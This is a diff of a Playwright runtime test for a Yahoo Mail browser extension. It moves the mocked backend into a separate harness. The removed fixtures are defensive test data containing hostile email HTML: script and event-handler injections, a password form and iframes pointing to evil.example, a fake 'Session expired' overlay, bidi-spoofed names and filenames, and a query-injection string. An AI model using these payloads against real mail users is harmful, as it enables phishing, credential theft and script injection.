@@ -1,205 +1,11 @@
 // Runtime test: loads the real extension into Chromium with a mocked Yahoo backend and
 // drives reading, folder switching, and compose/send. node tools/runtime.js
-const { chromium } = require("playwright");
 const path = require("path");
 const fs = require("fs");
-const os = require("os");
-
-const EXT = path.join(__dirname, "..", "ext");
-const now = Math.floor(Date.now() / 1000);
-const goneElsewhere = new Set();
-let convFail = false, deckBinary = false;   // Yahoo's converter gives up (813); the deck's bytes are binary   // messages another device removed; list queries leave them out
-// Every third message has a file; message 4 has only images built into its body, which are not files.
-// Projects/FPGA (32) carries bidi controls in its names, subjects and filenames.
-const RLO = "\u202E", PDF = "\u202C", RLI = "\u2067", PDI = "\u2069";
-const msg = (i, folder) => folder === "32" ? spoofed(plainMsg(i, folder)) : plainMsg(i, folder);
-const spoofed = m => ({ ...m, headers: { ...m.headers, subject: `Pay ${RLO}eulav${PDF} ${m.id.split("_")[1]}`, from: [{ name: `Bob${RLI}evil${PDI}`, email: m.headers.from[0].email }] } });
-const plainMsg = (i, folder) => ({ id: `MSG${folder}_${i}`, conversationId: `C${i}`, modSeq: i, size: 1000, csid: `csid${i}`,
-  attachmentCount: i % 3 === 0 ? 1 : i === 4 ? 2 : 0,
-  attachments: i % 3 === 0 ? [{ disposition: "attachment", filename: "f.pdf" }] : i === 4 ? [{ disposition: "inline" }, { disposition: "inline" }] : [],
-  flags: { read: i % 2 === 0, flagged: false },
-  headers: { subject: `Subject ${folder}-${i}`, from: [{ name: `Sender ${i}`, email: `s${i}@x.com` }], to: [{ name: "Me", email: "me@yahoo.com" }], cc: [{ name: "Other", email: "o@x.com" }], date: String(now - i * 40000) },
-  folder: { id: folder, name: folder === "1" ? "Inbox" : "Other" }, snippet: "snip" });
-const folders = [
-  { id: "1", name: "Inbox", types: ["INBOX"], unread: 3, total: 10, highestModSeq: 10 },
-  { id: "3", name: "Draft", types: ["DRAFT"], unread: 0, total: 1, highestModSeq: 11 },
-  { id: "2", name: "Sent", types: ["SENT"], unread: 0, total: 8, highestModSeq: 11 },
-  { id: "4", name: "Trash", types: ["TRASH"], unread: 0, total: 1, highestModSeq: 12 },
-  { id: "62", name: "Archive", types: ["ARCHIVE"], unread: 0, total: 0, highestModSeq: 16 },
-  { id: "6", name: "Bulk", types: ["BULK"], unread: 0, total: 2, highestModSeq: 17 },
-  { id: "31", name: "Projects", types: ["USER"], unread: 0, total: 5, highestModSeq: 13 },
-  { id: "32", name: "Projects/FPGA", types: ["USER"], unread: 0, total: 3, highestModSeq: 14 },
-  { id: "40", name: "Travel", types: ["USER"], unread: 0, total: 0, highestModSeq: 18 },
-  { id: "41", name: "Travel/2025", types: ["USER"], unread: 0, total: 12, highestModSeq: 19 },
-];
-const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", isPrimary: true, isSending: true, type: "FREE", signature: "<i>sig</i>", signatureActive: true }];
+const { launch } = require("./harness");
 
 (async () => {
-  const profile = fs.mkdtempSync(path.join(os.tmpdir(), "baltazar-mail-profile-"));
-  // No host outside the mocks resolves, so nothing can reach the real network.
-  const ctx = await chromium.launchPersistentContext(profile, { channel: "chromium", headless: true,
-    args: [`--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`, "--no-proxy-server", "--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1"] });
-  const sw = ctx.serviceWorkers()[0] || await ctx.waitForEvent("serviceworker");
-  const extId = new URL(sw.url()).host;
-  // Requests to hosts without a mock are recorded and refused (later routes take precedence).
-  const unexpectedHosts = new Set();
-  await ctx.route(/^https?:\/\//, r => { unexpectedHosts.add(new URL(r.request().url()).hostname); return r.abort(); });
-  const calls = [], docCalls = [];
-  let failSaves = 0;   // draft saves to answer with a server error
-  let failMoves = 0;   // moves to answer with a server error
-  let listDelay = 0;   // ms to hold message list answers, for actions during a slow load
-  let failSends = 0;   // sends to answer with a server error
-  let hiddenFetched = false;
-  // GitHub's release API, asked once a day for the newest version
-  const ghCalls = [];
-  await ctx.route("https://api.github.com/**", route => {
-    ghCalls.push({ url: route.request().url(), cookie: route.request().headers().cookie || "" });
-    return route.fulfill({ contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify({ tag_name: "v99.0.0" }) });
-  });
-  await ctx.route("https://ecp.yusercontent.com/**", route => route.fulfill({ contentType: "image/png", body: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAEklEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64") }));
-  await ctx.route("https://mail.yahoo.com/**", async route => {
-    const req = route.request();
-    if (req.url().includes("hidden-in-alt")) hiddenFetched = true;
-    if (req.url() === "https://mail.yahoo.com/") return route.fulfill({ contentType: "text/html", body: '<html><script>window.AppBootstrapData={"appId":"YMailCLDNovation","mailWssid":"w1","primaryMailbox":{"email":"me@yahoo.com","id":"MB1"}}</script></html>' });
-    const name = new URL(req.url()).searchParams.get("name");
-    const post = req.postData() || "";
-    const headers = req.headers();
-    const jsonM = post.match(/name="batchJson"\r\n\r\n([\s\S]*?)\r\n--/);
-    const envelope = jsonM ? JSON.parse(jsonM[1]) : null;
-    const fileParts = [...post.matchAll(/name="([^"]+)"; filename="([^"]+)"/g)].map(m => [m[1], m[2]]);
-    calls.push({ name, origin: headers.origin, envelope, fileParts });
-    const top = envelope?.requests?.[0] || {};
-    const uri = top.uri || "";
-    if (name === "messageGroups.getList" && listDelay) await new Promise(r => setTimeout(r, listDelay));
-    if (name === "messages.saveAndSend" && failSends > 0) {
-      failSends--;
-      return route.fulfill({ contentType: "application/json", body: JSON.stringify({ error: { code: "EC-5003", message: "Internal error" } }) });
-    }
-    if (name === "messages.move" && failMoves > 0) {
-      failMoves--;
-      return route.fulfill({ contentType: "application/json", body: JSON.stringify({ error: { code: "EC-5003", message: "Internal error" } }) });
-    }
-    if (name === "messages.saveV3" && failSaves > 0) {
-      failSaves--;
-      return route.fulfill({ contentType: "application/json", body: JSON.stringify({ error: { code: "ES-5000", message: "save failed" } }) });
-    }
-    let responses;
-    if (uri.endsWith("/folders")) responses = [{ id: top.id, httpCode: 200, response: { result: { folders, accounts: [] } } }];
-    else if (uri.endsWith("/accounts")) responses = [{ id: top.id, httpCode: 200, response: { result: { accounts } } }];
-    else if (uri.includes("/content/simplebody/full")) {
-      const id = uri.match(/@\.id==(MSG[^/]+)/)[1];
-      const message = msg(Number(id.split("_")[1]), id.split("_")[0].slice(3));
-      message.attachments = [
-        { partId: "2", filename: "report.pdf", size: 52000, disposition: "attachment", type: "application", subtype: "pdf", contentId: "<rep@x>", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/pdf", textExtractionUrl: "https://cloud-apis.mail.yahoo.com/text/2?appid=x" },
-        { partId: "3", filename: "data.csv", size: 900, disposition: "attachment", type: "text", subtype: "csv", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/csv", textExtractionUrl: "https://cloud-apis.mail.yahoo.com/text/3?appid=x" },
-        { partId: "4", filename: "src.zip", size: 400, disposition: "attachment", type: "application", subtype: "zip", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/zip" },
-        { partId: "5", filename: "photo.png", size: 70, disposition: "attachment", type: "image", subtype: "png", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/png", thumbnailUrl: "https://cloud-apis.mail.yahoo.com/thumb/5?appid=x" },
-        { partId: "6", filename: "cv.docx", size: 33000, disposition: "attachment", type: "application", subtype: "vnd.openxmlformats-officedocument.wordprocessingml.document", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/docx", textExtractionUrl: "https://cloud-apis.mail.yahoo.com/text/6?appid=x" },
-        { partId: "7", filename: "budget.xlsx", size: 17000, disposition: "attachment", type: "application", subtype: "vnd.openxmlformats-officedocument.spreadsheetml.sheet", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/xlsx" },
-        { partId: "8", filename: "deck.pptx", size: 90000, disposition: "attachment", type: "application", subtype: "vnd.openxmlformats-officedocument.presentationml.presentation", downloadUrl: "https://cloud-apis.mail.yahoo.com/dl/pptx", documentId: "DOC8" },
-      ];
-      if (id.startsWith("MSG32_")) message.attachments[2].filename = `inv${RLO}fdp.exe`;
-      // a draft whose reply reference is not a message id: it must not reach a query
-      if (id.startsWith("MSG3_")) message.inReplyTo = { messageReference: { id: "X) OR id:(Y" }, replied: true };
-      // One inline image in Yahoo's real part-thumbnail shape, which must be inlined, and one address
-      // hidden in an alt attribute, which must never be requested.
-      // Part 5 is one Yahoo cannot render (EP-5001); it is cut out of the message source instead.
-      const inline = `<img src="https://cloud-apis.mail.yahoo.com/ws/v3/mailboxes/@.id==MB1/messages/@.id==${id}/content/parts/@.id==2/thumbnail&amp;appid=x&amp;pid=2">` +
-        `<img src="https://cloud-apis.mail.yahoo.com/ws/v3/mailboxes/@.id==MB1/messages/@.id==${id}/content/parts/@.id==5/thumbnail&amp;appid=x&amp;pid=5">` +
-        `<img alt="x src='https://mail.yahoo.com/ws/v3/hidden-in-alt'" src="https://ecp.yusercontent.com/p.png">` +
-        // a layout spacer: a square PNG stretched by CSS, kept one pixel tall by its attributes
-        `<img id="spacer" style="min-width:640px;min-height:1px" width="640" height="1" src="data:image/png;base64,${thumbPng.toString("base64")}">`;
-      // a white card with dark text, which the dark reader turns into a dark card with light text
-      const card = `<div id="paper" style="background-color:#ffffff;color:#333333">Card</div>`;
-      // Drafts also carry a quote a hostile sender could plant: a box over the whole window, a
-      // data: URL that is not an image, and one that does not decode.
-      // Projects messages carry what the reader's cleaning must remove or neutralise.
-      const unsafe = id.startsWith("MSG31_") ? `<script>parent.pwned = 1</script><img id="h-img" src="data:," onerror="parent.pwned = 1">` +
-        `<form id="h-form" action="https://evil.example/"><input id="h-input" name="pw"><button>Go</button></form>` +
-        `<a id="h-link" href="https://evil.example/" ping="https://evil.example/ping" target="_top">link</a>` +
-        `<img src="data:," usemap="#m"><map name="m"><area id="h-area" href="https://evil.example/" target="_self" shape="rect" coords="0,0,9,9"></map>` +
-        `<svg><a id="h-svga" href="https://evil.example/" target="_self"><text y="9">x</text></a></svg>` +
-        `<meta http-equiv="refresh" content="0;url=https://evil.example/"><iframe id="h-frame" src="https://evil.example/"></iframe>` +
-        `<object id="h-obj" data="https://evil.example/x"></object><svg id="h-svg" onload="parent.pwned = 1"><circle r="1"/></svg>` : "";
-      // Every message tries to hide or cover the printed header.
-      const forge = id.startsWith("MSG3_") ? "" : `<style>.hdr, .hdr * { display: none !important }</style>` +
-        `<div id="forge" style="position:fixed;top:0;left:0;width:100%;height:160px;background:#fff;z-index:9">Fake header</div>`;
-      const hostile = id.startsWith("MSG3_") ? `<div id="overlay" style="position:fixed;inset:0;z-index:2147483647;background:#f00">Session expired</div>` +
-        `<img src="data:text/html;base64,PGgxPmhpPC9oMT4=">` + `<img src="data:image/png;base64,@@not base64@@">` : "";
-      responses = [{ id: top.id, httpCode: 200, response: { result: { message, simpleBody: { html: `<p>Body of <b>${id}</b></p>${inline}${card}${hostile}${unsafe}${forge}` } } } }];
-    }
-    else if (uri === "/ws/docpreview/v2/fetch") {
-      // Yahoo's converter: first ask is still queued, then pages arrive entity-encoded.
-      docCalls.push({ docId: headers["docs-document-id"], ...top.payload });
-      const enc = s => s.replace(/[<>"&=#;:/ ]/g, c => `&#${c.charCodeAt(0)};`);
-      const pages = {};
-      if (top.payload.retryCount > 0 && !convFail) for (let n = top.payload.start_page; n <= Math.min(5, top.payload.end_page); n++)
-        pages["page" + n] = { html: enc(`<div class="aps-page"><p class="t">Slide ${n === 1 ? "one" : n}</p><script>bad()</script><a href="javascript:bad()">x</a></div>`), css: `.aps-page .t { font-size: 20pt; } </sty</style>le><img id="css-escape" src="data:,">`, statuscode: 700, pdfEmbed: false };
-      responses = [{ id: top.id, httpCode: 200, response: Object.keys(pages).length ? { code: 800, statuscode: 600, info: { num_pages: 5, dimension: { w: 900, h: 1400 } }, pages } : { code: convFail ? 813 : 814, statuscode: 600, pages: {} } }];
-    }
-    else if (top.id === "SaveMessage") {
-      const saved = { ...msg(99, "3"), id: "MSGDRAFT_99", immutableid: "IMM99", csid: top.payloadParts[0].payload.message.csid };
-      responses = [{ id: "SaveMessage", httpCode: 200, response: { result: { message: saved, simpleBody: {} } } }];
-      for (const r of top.requests || []) responses.push({ id: r.id, httpCode: 200, response: { result: { message: saved } } });
-    }
-    else if (/"method":"(POST|DELETE)"/.test(post)) responses = [...post.matchAll(/"id":"((?:UnifiedUpdateMessage|UnifiedDeleteMessage)_\d+)"/g)].map(m => ({ id: m[1], httpCode: 204 }));
-    else { const q = decodeURIComponent(uri.split("q=")[1] || ""); const folder = (q.match(/folderId:(\d+)/) || [])[1] || "1"; const empty = /(^|[^-])folderId:(62|40)\b/.test(q); responses = [{ id: top.id, httpCode: 200, response: { result: { messages: empty ? [] : Array.from({ length: 8 }, (_, i) => msg(i + 1, folder)).filter(m => !goneElsewhere.has(m.id)), query: {} } } }]; }
-    return route.fulfill({ contentType: "application/json", body: JSON.stringify({ result: { responses, status: {} }, error: null }) });
-  });
-
-  // Raw message source holding the real attachment bytes, numbered as Yahoo numbers them.
-  const FX = path.join(__dirname, "fixtures");
-  const b64 = buf => buf.toString("base64").replace(/.{76}/g, "$&\r\n");
-  const part = (type, name, buf) => `--BOUND\r\nContent-Type: ${type}; name="${name}"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename="${name}"\r\n\r\n${b64(buf)}\r\n`;
-  const rawFor = () => "From: s@x.com\r\nSubject: test\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"BOUND\"\r\n\r\npreamble\r\n" +
-    "--BOUND\r\nContent-Type: text/plain\r\n\r\nBody\r\n" +
-    part("application/pdf", "report.pdf", fs.readFileSync(path.join(FX, "report.pdf"))) +
-    part("text/csv", "data.csv", Buffer.from("name,qty\nZ80,2\n6502,1\n")) +
-    part("application/zip", "src.zip", zipBytes) +
-    part("image/png", "photo.png", thumbPng) +
-    part("application/octet-stream", "cv.docx", fs.readFileSync(path.join(FX, "cv.docx"))) +
-    part("application/octet-stream", "budget.xlsx", fs.readFileSync(path.join(FX, "budget.xlsx"))) +
-    part("application/octet-stream", "deck.pptx", deckBinary ? Buffer.from([0x50, 0x4b, 3, 4, 0x14, 0, 0, 0, 0x41, 0x42]) : Buffer.from("not really a deck")) + "--BOUND--\r\n";
-  const rawCalls = [];
-  await ctx.route("https://apis.mail.yahoo.com/**", route => {
-    const u = route.request().url();
-    rawCalls.push({ url: u, origin: route.request().headers().origin });
-    if (u.includes("/content/rawplaintext")) return route.fulfill({ contentType: "text/plain", body: rawFor() });
-    return route.fulfill({ status: 404, body: "" });
-  });
-  let thumbFull = false;
-  const thumbPng = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAEklEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64");
-  const zipBytes = Buffer.from("UEsDBBQAAAAAAI8CX12Tpho8uAEAALgBAAAKAAAAc3JjL21haW4uY2ludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KUEsDBBQAAAAAAI8CX10gMDo2BgAAAAYAAAAJAAAAUkVBRE1FLm1kaGVsbG8KUEsBAhQDFAAAAAAAjwJfXZOmGjy4AQAAuAEAAAoAAAAAAAAAAAAAAIABAAAAAHNyYy9tYWluLmNQSwECFAMUAAAAAACPAl9dIDA6NgYAAAAGAAAACQAAAAAAAAAAAAAAgAHgAQAAUkVBRE1FLm1kUEsFBgAAAAACAAIAbwAAAA0CAAAAAA==", "base64");
-  await ctx.route("https://cloud-apis.mail.yahoo.com/**", route => {
-    const u = route.request().url();
-    // Yahoo's download links cannot be fetched (redirect the page cannot follow), as in production.
-    if (u.includes("/dl/")) return route.abort("failed");
-    if (u.includes("/text/3")) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ result: { textExtractResult: "name,qty\nZ80,2\n6502,1\n" } }) });
-    if (u.includes("/text/2")) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ result: { textExtractResult: "Quarterly report\nPage 1" } }) });
-    if (u.includes("/text/")) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ result: { textExtractResult: "Jorge Ruiz\nEngineer" } }) });
-    if (u.includes("/parts/@.id==5/thumbnail")) return route.fulfill({ status: 501, contentType: "application/json", body: '{"error":{"code":"EP-5001"}}' });
-    if (u.includes("/thumb/") && u.includes("size=2048w")) thumbFull = true;
-    return route.fulfill({ contentType: "image/png", body: thumbPng });
-  });
-  const page = await ctx.newPage();
-  const errors = [];
-  page.on("pageerror", e => errors.push("pageerror: " + e.message));
-  const cspViolations = [];
-  const onConsole = m => {
-    const t = m.text();
-    // The sandboxed reader frame's request for Yahoo's image proxy cannot be intercepted by
-    // Playwright, and this test machine has no internet; that one load failing is expected.
-    if (/^https:\/\/ecp\.yusercontent\.com\//.test(m.location()?.url || "") && /ERR_TUNNEL|ERR_NAME|ERR_PROXY/.test(t)) return;
-    // The inline part Yahoo cannot render answers 501, as in production; the browser logs it.
-    if (/\/parts\/@\.id==5\/thumbnail/.test(m.location()?.url || "") && /status of 501/.test(t)) return;
-    // Playwright adds its own listeners to a frame it has looked into; in the reader frame, where
-    // no script may run, the browser blocks them and says so on every click and key.
-    if (/^about:srcdoc/.test(m.location()?.url || "") && t.includes("the 'allow-scripts' permission is not set")) return;
-    if (/Content Security Policy|violates the following/.test(t)) cspViolations.push(t.slice(0, 220));
-    // EC-5003 is the error the failed-archive step provokes on purpose; the app logs it
-    else if (m.type() === "error" && !t.includes("net::ERR_FAILED") && !t.includes('"code":"EC-5003"')) errors.push("console: " + t.slice(0, 200));
-  };
-  page.on("console", onConsole);
+  const { ctx, page, extId, profile, calls, docCalls, rawCalls, ghCalls, mock, folders, goneElsewhere, errors, cspViolations, unexpectedHosts, FX } = await launch();
   await page.goto(`chrome-extension://${extId}/mail.html`);
   const results0 = {};
   // rowH is the old pixel row height: 18 px (compact) becomes 80%, still 18 px rows
@@ -218,11 +24,11 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
 
   // an action while a folder's first page is still loading must not leave that folder empty
   // (Shift+Z with nothing to redo goes through the same action path and changes no mail)
-  listDelay = 1200;
+  mock.listDelay = 1200;
   await page.locator("#folder-list .folder", { hasText: "Sent" }).click(); await page.waitForTimeout(150);
   await page.locator("#list").focus(); await page.keyboard.press("Shift+Z");
   await page.waitForTimeout(3500);
-  listDelay = 0;
+  mock.listDelay = 0;
   results.slowLoad = { rows: await page.locator("#rows .row").count(), title: await page.locator("#list-title").textContent().catch(() => "") };
   await page.locator("#folder-list .folder", { hasText: "Inbox" }).click(); await page.waitForSelector("#rows .row");
   await page.waitForTimeout(300);
@@ -245,7 +51,7 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
   }).catch(e => ({ error: e.message }));
   results.unsafe.pwned = await page.evaluate(() => window.pwned ?? null);
   const frameImgs = await page.frameLocator("#r-body").locator("img").evaluateAll(els => els.map(e => e.getAttribute("src") || ""));
-  results.inlineParts = { partInlined: /^data:image\/png/.test(frameImgs[0] || ""), fromSource: /^data:image\/png/.test(frameImgs[1] || ""), proxyKept: frameImgs[2] === "https://ecp.yusercontent.com/p.png", hiddenFetched,
+  results.inlineParts = { partInlined: /^data:image\/png/.test(frameImgs[0] || ""), fromSource: /^data:image\/png/.test(frameImgs[1] || ""), proxyKept: frameImgs[2] === "https://ecp.yusercontent.com/p.png", hiddenFetched: mock.hiddenFetched,
     clips: await page.locator("#rows .row .fl").evaluateAll(els => els.map(e => e.innerHTML ? 1 : 0).join("")),
     spacerHeight: await page.frameLocator("#r-body").locator("#spacer").evaluate(e => e.getBoundingClientRect().height) };
   results.originHeader = calls.find(c => c.name === "messages.getBody")?.origin;
@@ -428,7 +234,7 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
   results.rawOrigin = rawCalls[0]?.origin;
 
   // a file nothing can preview: offered as text when its bytes look like text, else as a hex dump
-  convFail = true;
+  mock.convFail = true;
   await page.locator("#v-prev").click();
   await page.waitForFunction(() => document.getElementById("v-name").textContent === "budget.xlsx" && !document.getElementById("v-body").textContent.startsWith("Loading"), null, { timeout: 15000 });
   await next("deck.pptx");
@@ -442,7 +248,7 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
   await page.waitForSelector("#viewer.hidden", { state: "attached", timeout: 5000 }).catch(() => {});
   results.vClosed = await page.locator("#viewer").isHidden();
   // another message whose deck is binary: the hex viewer
-  deckBinary = true;   // a row no earlier step opened, so its source is fetched fresh
+  mock.deckBinary = true;   // a row no earlier step opened, so its source is fetched fresh
   await page.locator("#rows .row").nth(3).click(); await page.waitForTimeout(600);
   await view(6);
   await page.waitForSelector("#v-raw", { timeout: 15000 });
@@ -453,7 +259,7 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
   await page.screenshot({ path: path.join(__dirname, "..", "out", "viewer-hex.png") }).catch(() => {});
   await f.evaluate(() => document.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true })));
   await page.waitForSelector("#viewer.hidden", { state: "attached", timeout: 5000 }).catch(() => {});
-  convFail = deckBinary = false;
+  mock.convFail = mock.deckBinary = false;
   await page.locator("#rows .row").nth(1).click(); await page.waitForTimeout(600);
 
   // contact card on hover over From
@@ -482,7 +288,7 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
   results.spam.undone = { subject: await page.locator("#r-subject").textContent(), sel: await page.locator("#rows .row.sel .sb").textContent() };
   // a failed action says so in a notice, in words first, with a report to copy; × dismisses it
   const rowsBefore = await page.locator("#rows .row").count();
-  failMoves = 1;
+  mock.failMoves = 1;
   await page.locator("#list").focus(); await page.keyboard.press("e");
   await page.waitForSelector("#notice:not(.hidden)", { timeout: 4000 }).catch(() => {});
   results.failedMove = { text: await page.locator("#notice-text").textContent(), tech: await page.locator("#notice-text .tech").textContent().catch(() => ""),
@@ -580,7 +386,7 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
   let serverError = {};
   if (clickAwayBad.open) {
     await page.locator("#c-to input").fill("keep@example.com"); await page.locator("#c-to input").press("Enter");
-    failSaves = 1;
+    mock.failSaves = 1;
     await page.locator("#c-editor").click(); await page.keyboard.press("Escape"); await page.waitForTimeout(400);
     serverError = { open: await composerOpen(), notice: await notice(), copy: await page.locator("#notice-copy").isVisible(), body: await page.locator("#c-editor").innerText() };
     await page.locator("#c-editor").click(); await page.keyboard.press("Escape");
@@ -679,7 +485,7 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
   await page.waitForSelector("#compose:not(.hidden)");
   queue.reopened = await page.inputValue("#c-subject");
   queue.stillPending = await page.locator("#st-undo").textContent();
-  failSends = 1;
+  mock.failSends = 1;
   await page.waitForFunction(() => document.getElementById("c-subject").value === "Queue A", null, { timeout: 15000 }).catch(() => {});
   queue.afterFail = { subject: await page.inputValue("#c-subject"), notice: await notice(), savedB: subjectsSaved().includes("Queue B"), sentB: subjectsSent().includes("Queue B") };
   page.once("dialog", d => d.accept());
